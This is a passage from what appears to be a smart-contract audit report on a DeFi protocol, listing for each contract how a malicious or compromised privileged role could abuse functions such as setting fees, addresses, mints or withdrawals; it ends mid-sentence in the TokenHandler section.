Moreover, the \u003ccode\u003esetTreasury()\u003c/code\u003e function lacks an \u003ccode\u003eaddress(0x0)\u003c/code\u003e check, the malicious owner can potentially set an treasury to \u003ccode\u003eaddress(0x0)\u003c/code\u003e and call the \u003ccode\u003erevokeUnclaimedReward()\u003c/code\u003e function which will lead to the tokens to be permanently locked/lost.\u003c/li\u003e\n\u003cli\u003eSet the start time of a Season very high: The \u003ccode\u003estartSeason()\u003c/code\u003e function allows the owner to set the start time of a reward season without any upper limit or sanity check on the provided timestamp. A malicious or compromised owner could abuse this by setting the start time far into the future (e.g., 100 years ahead), effectively preventing the season from ever beginning.\u003c/li\u003e\n\u003cli\u003eSet treasury to \u003ccode\u003eaddress(0x0)\u003c/code\u003e and call \u003ccode\u003erevokeUnclaimedReward()\u003c/code\u003e: The malicious or compromised owner can call set the treasury to \u003ccode\u003eaddress(0x0)\u003c/code\u003e and then call the \u003ccode\u003erevokeUnclaimedReward()\u003c/code\u003e function, permanently loosing the funds.\u003c/li\u003e\n\u003cli\u003eNever finalize a season: The finalize function already holds solid checks; however, there can still be a misuse of a owner to never potentially finalize a season.\u003c/li\u003e\n\u003cli\u003eExtend claim duration to so high that the season never finalizes: The \u003ccode\u003eextendClaimDuration()\u003c/code\u003e function lacks checks to see if the claim duration amount is in bounds or not, the malicious or compromised owner can extend the claim duration to so high that finalization of a season will be impossible. Even if the compromised owner key is retained back to its original owner there is nothing that can be done.\u003c/li\u003e\n\u003cli\u003eRisk of reward censorship: The \u003ccode\u003ereportRewards()\u003c/code\u003e function only updates the rewards for the addresses explicitly passed in, a malicious or biased owner could intentionally omit certain players from the \u003ccode\u003eplayers_\u003c/code\u003e array. As a result, those omitted players would not receive their rightful rewards, even if they earned them during the season. This introduces a risk of reward censorship.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e3. In the In the BlackGovernor.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMinter:\u003c/strong\u003e The Minter role in the BlackGovernor contract is a role assigned to a smart contract. Since the role is assigned to a contract (predefined methods), no governance manipulation may be possible for this role.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTeam:\u003c/strong\u003e The team role has the ability to set a proposal numerator and renounce its ownership to someone else. Here’s how a user with a team role can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet proposal numerator to zero: The malicious or compromised user with team role can set the proposal numerator to zero, potentially allowing anyone to propose even with 0 votes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e4. In the Bribes.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e In the Bribes contract, the owner has the ability to set a new Voting, GaugeManager, AVM addresses. He also has the power over \u003ccode\u003erecoverERC20AndUpdateData()\u003c/code\u003e and \u003ccode\u003eemergencyRecoverERC20()\u003c/code\u003e functions. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet malicious contracts: The owner can assign malicious contract addresses for the voter, \u003ccode\u003egaugeManager\u003c/code\u003e, \u003ccode\u003ebribeFactory\u003c/code\u003e, or AVM; such that it benefits him, enabling backdoors or unauthorized control. These contracts could be programmed to redirect fees, manipulate votes, or extract value from user interactions — disguised as legitimate protocol behavior, but actually benefiting the malicious owner.\u003c/li\u003e\n\u003cli\u003eSteal rewards in the guise of recovery: The \u003ccode\u003eonlyAllowed\u003c/code\u003e role can invoke this function to withdraw arbitrary ERC20 tokens from the contract. They could manipulate reward accounting by subtracting \u003ccode\u003etokenAmount\u003c/code\u003e from the \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e, under-reporting actual rewards. This allows them to steal reward withdraw tokens meant for user rewards under the guise of “recovery”. Potentially few, or many users, might not receive their rewards, as it has been taken by the owner by the guise of recovery.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVoter:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGaugeManager:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMinter:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAvm\u003c/strong\u003e: No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e5. In the CustomPoolDeployer.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003eaddAuthorizedAccount\u003c/code\u003e, \u003ccode\u003eremoveAuthorizedAccount\u003c/code\u003e, \u003ccode\u003esetPluginForPool\u003c/code\u003e, \u003ccode\u003esetPlugin\u003c/code\u003e, \u003ccode\u003esetPluginConfig\u003c/code\u003e, \u003ccode\u003esetFee\u003c/code\u003e, \u003ccode\u003esetCommunityFee\u003c/code\u003e, \u003ccode\u003esetAlgebraFeeRecipient\u003c/code\u003e, \u003ccode\u003esetAlgebraFeeManager\u003c/code\u003e, \u003ccode\u003esetAlgebraFeeShare\u003c/code\u003e, \u003ccode\u003esetAlgebraFarmingProxyPluginFactory\u003c/code\u003e, \u003ccode\u003esetAlgebraFactory\u003c/code\u003e, \u003ccode\u003esetAlgebraPluginFactory\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBackdoor privilege escalation via \u003ccode\u003eaddAuthorizedAccount\u003c/code\u003e: The owner can maliciously add multiple alternate EOA addresses or smart contracts as authorized accounts, effectively creating hidden backdoors for retaining control. These authorized entities could automate harmful actions such as setting high fees, bypassing restrictions, or manipulating internal state. Even after ownership is transferred, the previous owner may still retain access through these accounts and manipulate functions which are still accessible to the authorized accounts. While a \u003ccode\u003eremoveAuthorizedAccount\u003c/code\u003e function exists, the cleanup burden falls entirely on the new owner, who must manually revoke each account — a tedious process if many were pre-added.\u003c/li\u003e\n\u003cli\u003eFee manipulation via \u003ccode\u003esetFee()\u003c/code\u003e: A malicious owner can exploit the \u003ccode\u003esetFee()\u003c/code\u003e function to assign excessively high fees to a pool. This would result in an unfairly large portion of each user transaction being taken as fees, effectively discouraging usage, draining user value.\u003c/li\u003e\n\u003cli\u003eDeploy and set malicious factories: The owner could deploy malicious versions of these factories that generate contracts with backdoors or vulnerabilities. For example: farming Plugin Factory could redirect user rewards to the owner’s address, Algebra Factory could deploy pools with manipulated fee logic or ownership traps, Plugin Factory could enable unauthorized access or data leakage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAuthorized:\u003c/strong\u003e The Authorized role has the ability to \u003ccode\u003esetPluginForPool\u003c/code\u003e, \u003ccode\u003esetPlugin\u003c/code\u003e, \u003ccode\u003esetPluginConfig\u003c/code\u003e, \u003ccode\u003esetFee\u003c/code\u003e, \u003ccode\u003esetCommunityFee\u003c/code\u003e. Here’s how a user with a Authorized role can misuse his power:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet high community fees: The protocol does not implement a cap on fees, allowing the malicious or compromised authorized role to set high fees. This does not pose much risk since the owner can just take away the authorized role from the user and set the fees properly again. However, if the owner is malicious or compromised then it’s a different scenario.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e6. In the CustomToken.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to mint and burn tokens from an account, Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMint a large sum: The owner can mint a large sum into a random account to inflate the value of the token. He can even mint tokens to his personal account to have more value.\u003c/li\u003e\n\u003cli\u003eBurn a large sum: The owner can exploit the mint and burn functions to manipulate token supply and market value. For example, the owner could burn a significant number of tokens from user accounts to reduce total supply, artificially inflating the token’s value. Simultaneously, the owner could mint a large number of tokens to their own account, allowing them to benefit from the deflationary effect they induced.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e7. In the Fan.sol contract\u003c/strong\u003e - \u003cem\u003eNote: Same as CustomToken contract (see number 6 above.)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e8. In the GaugeExtraRewarder.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003erecoverERC20\u003c/code\u003e and \u003ccode\u003esetDistributionRate\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet an extremely low amount in \u003ccode\u003esetDistributionRate\u003c/code\u003e: A compromised or malicious owner can deliberately set the reward amount very low, causing the distribution rate to slow down significantly and resulting in reduced rewards that may frustrate or disincentivize users.\u003c/li\u003e\n\u003cli\u003eBreak reward mechanism: The owner can call \u003ccode\u003erecoverERC20\u003c/code\u003e to withdraw any ERC20 token held by the contract, including the \u003ccode\u003erewardToken\u003c/code\u003e. Even though there is a check to limit withdrawal of the \u003ccode\u003erewardToken\u003c/code\u003e to the not-yet-distributed amount, the owner can still  withdraw tokens that users expect as rewards; with potential to reduce or disrupt user rewards by withdrawing tokens from the contract.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGAUGE:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e9. In the GaugeManager.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to set the Avm address. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet a malicious contract to benefit himself: A compromised or  malicious Owner sets avm to a contract that looks like a voting escrow manager but has hidden backdoors. This malicious AVM could potentially divert locked tokens to the owner.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGaugeAdmin:\u003c/strong\u003e The GaugeAdmin has the ability to \u003ccode\u003esetBribeFactory\u003c/code\u003e, \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e, \u003ccode\u003esetVoter\u003c/code\u003e, \u003ccode\u003esetGenesisManager\u003c/code\u003e, \u003ccode\u003esetBlackGovernor\u003c/code\u003e, \u003ccode\u003esetFarmingParam\u003c/code\u003e, \u003ccode\u003esetNewBribes\u003c/code\u003e, \u003ccode\u003esetInternalBribeFor\u003c/code\u003e, \u003ccode\u003esetExternalBribeFor\u003c/code\u003e, \u003ccode\u003esetMinter\u003c/code\u003e, \u003ccode\u003eaddGaugeFactory\u003c/code\u003e, \u003ccode\u003ereplaceGaugeFactory\u003c/code\u003e, \u003ccode\u003eremoveGaugeFactory\u003c/code\u003e, \u003ccode\u003eaddPairFactory\u003c/code\u003e, \u003ccode\u003ereplacePairFactory\u003c/code\u003e, \u003ccode\u003eremovePairFactory\u003c/code\u003e, \u003ccode\u003eacceptAlgebraFeeChangeProposal\u003c/code\u003e. Here’s how he can misuse his power:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMisuse critical functions: A malicious or compromised admin, having exclusive access to these functions, can misuse their powers by arbitrarily setting or replacing critical contract components such as the minter, gauge factories, and pair factories, which control key protocol behaviors like minting and gauge creation. By setting a malicious minter or injecting compromised factories, the admin could mint unlimited tokens, manipulate liquidity incentives, or redirect funds. Furthermore, the admin can unilaterally accept fee changes on Algebra pools, potentially increasing fees or redirecting revenue without community consent.\u003c/li\u003e\n\u003cli\u003eArbitrarily change addresses: They can arbitrarily change the addresses of key farming contracts (\u003ccode\u003efarmingCenter\u003c/code\u003e, \u003ccode\u003ealgebraEternalFarming\u003c/code\u003e, \u003ccode\u003enfpm\u003c/code\u003e), potentially redirecting farming rewards or incentives to malicious contracts. Additionally, by setting or replacing internal and external bribes on any gauge, the admin can manipulate voting incentives and reward distributions, possibly favoring certain participants or contracts unfairly. Since these settings directly influence how rewards and incentives flow within the protocol, the admin’s unchecked ability to alter them creates a significant risk of abuse, including funneling rewards to themselves or collaborators, destabilizing the ecosystem, and undermining user trust.\u003c/li\u003e\n\u003cli\u003eAdmin replaces the Bribe Factory and Permission Registry with malicious contracts: The admin, having full control, sets the \u003ccode\u003ebribefactory\u003c/code\u003e to a malicious contract they control. This fake bribe factory redirects all bribe rewards intended for legitimate liquidity providers or voters to the admin’s own address. Meanwhile, the admin also replaces the \u003ccode\u003epermissionRegistry\u003c/code\u003e with a contract that falsely approves only their own addresses or bots for privileged actions, effectively locking out honest participants. With the voter contract replaced by one that the admin controls, they can manipulate governance votes or decisions, passing proposals that benefit themselves or their allies, like lowering fees or minting tokens unfairly. At the same time, the admin sets \u003ccode\u003eblackGovernor\u003c/code\u003e to their own address, giving them the power to block or censor any proposals or actions from other users, consolidating full control over governance.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e The governance role has the ability to revive and kill a gauge. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eKill gauges with malicious intent: A malicious governance actor can intentionally kill legitimate gauges under the pretense that they are “malicious”, using the \u003ccode\u003ekillGauge\u003c/code\u003e function. Since there is no on-chain validation of malicious behavior in the function itself, just a check that \u003ccode\u003eisAlive[_gauge]\u003c/code\u003e is true—they can arbitrarily target any active gauge.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e10. In the GaugeV2.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003esetDistribution\u003c/code\u003e, \u003ccode\u003esetGaugeRewarder\u003c/code\u003e, \u003ccode\u003esetInternalBribe\u003c/code\u003e, \u003ccode\u003eactivateEmergencyMode\u003c/code\u003e, \u003ccode\u003estopEmergencyMode\u003c/code\u003e and \u003ccode\u003esetGenesisPoolManager\u003c/code\u003e. Here’s how he can misuse his powers;\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA malicious owner could stealthily redirect critical reward and bribe flows to attacker-controlled contracts by setting the internal bribe, gauge rewarder, and distribution addresses to malicious contracts. They could also consolidate control by assigning the genesis pool manager to themselves or colluding contracts, gaining influence over early-stage pools and rewards. Additionally, the owner can arbitrarily trigger and stop emergency mode, halting or manipulating protocol operations to stall users while executing self-serving upgrades or migrations. This unchecked power enables fund diversion, governance capture, loss of user trust, and backdoor control of key system parameters without any DAO or governance oversight, posing severe risks to protocol integrity and participant fairness.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGenesisManager:\u003c/strong\u003e The GenesisManager has the ability to set pools, Here’s how he can misuse his power:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSetting as \u003ccode\u003eaddress(0)\u003c/code\u003e: A compromised or malicious owner can set the Genesis Pool Manager to the zero address (\u003ccode\u003eaddress(0)\u003c/code\u003e), as the \u003ccode\u003esetGenesisPoolManager()\u003c/code\u003e function lacks a validation check to prevent this. This could disable or break core protocol functionality that depends on the genesis manager.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e11. In the GenesisPool.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003egenesisManager:\u003c/strong\u003e The genesisManager has the ability to \u003ccode\u003esetGenesisPoolInfo\u003c/code\u003e, \u003ccode\u003erejectPool\u003c/code\u003e, \u003ccode\u003eapprovePool\u003c/code\u003e, \u003ccode\u003edepositToken\u003c/code\u003e, \u003ccode\u003etransferIncentives\u003c/code\u003e, \u003ccode\u003esetPoolStatus\u003c/code\u003e, \u003ccode\u003elaunch\u003c/code\u003e, \u003ccode\u003esetAuction\u003c/code\u003e, \u003ccode\u003esetMaturityTime\u003c/code\u003e and \u003ccode\u003esetStartTime\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet arbitrary parameters: The manager can misuse their role in \u003ccode\u003esetGenesisPoolInfo\u003c/code\u003e by providing malicious or incorrect input values since the function lacks proper input validation checks on critical parameters such as \u003ccode\u003egenesisInfo\u003c/code\u003e, \u003ccode\u003eallocationInfo\u003c/code\u003e, and \u003ccode\u003eauction\u003c/code\u003e. This enables the manager to set arbitrary genesis configurations, manipulate token allocation amounts, or assign a malicious \u003ccode\u003eauction\u003c/code\u003e contract that could siphon funds or behave unfairly.\u003c/li\u003e\n\u003cli\u003eReject pools arbitrarily: The manager can call \u003ccode\u003erejectPool()\u003c/code\u003e to mark any pool as \u003ccode\u003eNOT_QUALIFIED\u003c/code\u003e prematurely, blocking legitimate pools from proceeding and unfairly refunding proposed native tokens, potentially disrupting or censoring projects.\u003c/li\u003e\n\u003cli\u003eApprove malicious or fake pools: Using \u003ccode\u003eapprovePool()\u003c/code\u003e, the manager can approve pools with fake or attacker-controlled pair addresses (\u003ccode\u003e_pairAddress\u003c/code\u003e), enabling front-running, rug pulls, or other malicious activities disguised as legitimate pools.\u003c/li\u003e\n\u003cli\u003eManipulate deposits: In \u003ccode\u003edepositToken()\u003c/code\u003e, the manager controls when deposits are accepted (by controlling \u003ccode\u003epoolStatus\u003c/code\u003e and \u003ccode\u003egenesisInfo.startTime\u003c/code\u003e) and can arbitrarily restrict or allow deposits, effectively censoring or favoring certain users.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetPoolStatus\u003c/code\u003e to any pools without secondary authorization: The genesisManager can randomly set any pool’s status to “NOT QUALIFIED”. The protocol should implement a secondary role to make sure all interactions of genesisManager are appropriate or not.\u003c/li\u003e\n\u003cli\u003eSet a very high maturity: A compromised or malicious genesisManager can set a very high maturity time, the protocol does not implement an check to ensure that the maturity time is in bounds or not, making this scenario possible.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e12. In the GenesisPoolManager.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to set a router. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe current implementation of the code is incorrect, it only allows \u003ccode\u003eaddress(0)\u003c/code\u003e to be passed via \u003ccode\u003esetRouter()\u003c/code\u003e function, already favors the compromised or malicious owner.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e The Governance role has the ability to \u003ccode\u003ewhiteListUserAndToken\u003c/code\u003e, \u003ccode\u003edepositNativeToken\u003c/code\u003e, \u003ccode\u003erejectGenesisPool\u003c/code\u003e, \u003ccode\u003eapproveGenesisPool\u003c/code\u003e, \u003ccode\u003esetAuction\u003c/code\u003e, \u003ccode\u003esetEpochController\u003c/code\u003e, \u003ccode\u003esetMinimumDuration\u003c/code\u003e, \u003ccode\u003esetMinimumThreshold\u003c/code\u003e, \u003ccode\u003esetMaturityTime\u003c/code\u003e and \u003ccode\u003esetGenesisStartTime\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWhitelisting arbitrary tokens or users (backdoor access): By calling\n\u003ccode\u003ewhiteListUserAndToken\u003c/code\u003e (\u003ccode\u003eproposedToken\u003c/code\u003e, \u003ccode\u003etokenOwner\u003c/code\u003e), governance can whitelist unvetted or malicious tokens and users.\u003c/li\u003e\n\u003cli\u003eApproving fraudulent or unqualified pools: Governance can approve a genesis pool (\u003ccode\u003eapproveGenesisPool\u003c/code\u003e) regardless of community consensus or the token’s legitimacy. The function only checks a few conditions like balance and duration, but there’s no check on project credibility or voting outcome.The Governor can even approve pools which benefits him(a cut directed to his address on every transaction that takes place.)\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSilencing legitimate pools via rejection: By calling \u003ccode\u003erejectGenesisPool\u003c/code\u003e (\u003ccode\u003enativeToken\u003c/code\u003e), governance can deliberately shut down valid pools, sabotaging competitor projects.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eNote: Additionally all governance functions can be executed immediately with no time lock, delay, or DAO-based confirmation.\u003c/em\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetGenesisStartTime\u003c/code\u003e to years: The compromised or malicious governor can set the genesis start time to a long duration, such that genesis never begins.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e13. In the MinterUpgradable.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTeam:\u003c/strong\u003e The team role has the ability to set gauge manager and set team rate. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet malicious \u003ccode\u003egaugeManager\u003c/code\u003e contract: A compromised or malicious user with the team role can pass in a malicious \u003ccode\u003egaugeManager\u003c/code\u003e address such that it benefits him (e.g., Gauge emissions can be routed to attacker wallets).\u003c/li\u003e\n\u003cli\u003eSet team rate as Zero: Setting this as 0 would lead to the \u003ccode\u003eteamEmissions\u003c/code\u003e be transferred to the team as 0 every time \u003ccode\u003eupdate_period\u003c/code\u003e is called once every week.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e14. In the PermissionsRegistry.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eblackMultisig:\u003c/strong\u003e This role has the ability to \u003ccode\u003eaddRole\u003c/code\u003e, \u003ccode\u003eremoveRole\u003c/code\u003e, \u003ccode\u003esetRoleFor\u003c/code\u003e, \u003ccode\u003eremoveRoleFrom\u003c/code\u003e, \u003ccode\u003esetEmergencyCouncil\u003c/code\u003e and \u003ccode\u003esetBlackMultisig\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd arbitrary roles: The multisig can create meaningless or deceptive roles like, \u003ccode\u003eSUPER_ADMIN\u003c/code\u003e or \u003ccode\u003eUNLIMITED_MINTER\u003c/code\u003e — misleading names that may imply more power. Duplicate logical roles with different names (\u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e vs \u003ccode\u003eGaugeAdmin\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eAssign roles to malicious addresses: Assign critical roles (e.g., \u003ccode\u003eMINTER\u003c/code\u003e, \u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e, \u003ccode\u003eROUTER_SETTER\u003c/code\u003e, etc.) to an EOA owned by attacker, Malicious contract or rotate them silently over time.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e15. In the RewardsDistributor.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003esetDepositor\u003c/code\u003e, \u003ccode\u003ewithdrawERC20\u003c/code\u003e, \u003ccode\u003esetAVM\u003c/code\u003e and renounce his ownership. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSilent draining: Owner can drain any ERC-20 token held by the contract at any time, He can do this silently since no event is emitted when the owner withdraws erc20 tokens.\u003c/li\u003e\n\u003cli\u003eSet a malicious avm: As stated in my previous governance risks, the owner can set a malicious avm address such that it benefits him. This is a direct setting; there is no external validation by any other sources that the avm address set by the owner is actually valid or not.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e16. In the RouterV2.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003esetSwapRouter\u003c/code\u003e, \u003ccode\u003esetAlgebraFactory\u003c/code\u003e, \u003ccode\u003esetQuoterV2\u003c/code\u003e, \u003ccode\u003esetAlgebraPoolAPI\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious router: Owner sets \u003ccode\u003eswapRouter\u003c/code\u003e to a malicious contract that, front-runs user swaps by manipulating pricing logic, steals tokens during swaps by redirecting \u003ccode\u003etransferFrom\u003c/code\u003e to self and overrides routing logic to siphon fees to themselves.\u003c/li\u003e\n\u003cli\u003eSet a fake Algebra Factory: Owner sets a fake factory that, creates fake pools with manipulated or spoofed token addresses.\u003c/li\u003e\n\u003cli\u003eSet malicious \u003ccode\u003esetAlgebraPoolAPI\u003c/code\u003e: If this API contract stores sensitive pool metadata (e.g., fee config, pool status, time-weighted data). Owner can redirect it to a contract that lies about past data which could affect, time-weighted average price (TWAP), fee growth history and Oracle usage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e17. In the SetterTopNPoolsStrategy.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to set a avm address. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet a malicious avm: As stated in my previous governance risks, the owner can set a malicious avm address such that it benefits him. This is an direct setting; there is no external validation by any other sources that the avm address set by the owner is actually valid or not.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExecutor:\u003c/strong\u003e The executor role has the ability to \u003ccode\u003esetTopNPools\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe executor sets top pools to low-volume, illiquid, or fake pools that they own or control, have no real trading activity, inflate stats or visibility. These pools could then attract volume, wrongly perceived as top pools, to receive higher incentives or emissions and trick users or LPs into providing liquidity or trading, leading to loss.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e18. In the Thenian.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to withdraw, \u003ccode\u003esetRoot\u003c/code\u003e, \u003ccode\u003esetNftPrice\u003c/code\u003e and \u003ccode\u003ereserveNFTs\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRug pull: Owner can withdraw all ETH (e.g. mint proceeds) to any \u003ccode\u003emultiSig\u003c/code\u003e they control, leaving users who paid for NFTs with nothing in return.\u003c/li\u003e\n\u003cli\u003eIncrease price: Owner can dynamically raise the price after users are onboarded or committed, or lower the price for themselves or insiders after initial hype.\u003c/li\u003e\n\u003cli\u003eOwner can mint NFTs to themselves or insiders, before any public sale (sniping rare tokens), without paying in bulk to flip on secondary markets.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e19. In the TokenHandler.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e The governance role has the ability to \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e, \u003ccode\u003ewhitelistTokens\u003c/code\u003e, \u003ccode\u003ewhitelistToken\u003c/code\u003e, \u003ccode\u003eblacklistTokens\u003c/code\u003e, \u003ccode\u003ewhitelistNFT\u003c/code\u003e, \u003ccode\u003eblacklistNFT\u003c/code\u003e, \u003ccode\u003ewhitelistConnectors\u003c/code\u003e, \u003ccode\u003ewhitelistConnector\u003c/code\u003e, \u003ccode\u003eblacklistConnector\u003c/code\u003e, \u003ccode\u003esetBucketType\u003c/code\u003e, \u003ccode\u003eupdateTokenVolatilityBucket\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe primary governance risk across these functions lies in the potential abuse of role-based control. A malicious governance actor could 